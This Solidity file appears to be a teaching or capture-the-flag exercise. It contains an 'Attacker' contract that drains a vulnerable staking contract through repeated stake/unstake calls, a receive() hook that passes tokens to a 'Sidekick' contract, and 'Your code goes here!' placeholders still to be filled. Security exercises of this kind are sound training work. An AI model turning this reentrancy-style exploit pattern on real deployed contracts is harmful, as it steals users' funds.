// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVulnerable {
    function stake() external payable;

    function unstake() external;
}

interface ISidekick {
    function exploit() external payable;
}

contract Attacker {
    using SafeERC20 for IERC20;

    IVulnerable public target;
    IERC20 public token;
    ISidekick public sidekick;

    constructor(address _target, address tkn) {
        target = IVulnerable(_target);
        token = IERC20(tkn);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        token.transfer(address(sidekick), token.balanceOf(address(this)));

        /*
            Your code goes here!
        */
    }

    function exploit() public payable {
        if (token.balanceOf(address(this)) == 0) {
            uint target_money = 10 ether;
            uint collected_money = 0;
            while (collected_money < target_money) {
                target.stake{value: 1 ether}();
                target.unstake();
                collected_money += 1 ether;
            }
            sidekick.exploit();
        } else {
            target.unstake();
        }

        /*
            Your code goes here!
        */
    }
}
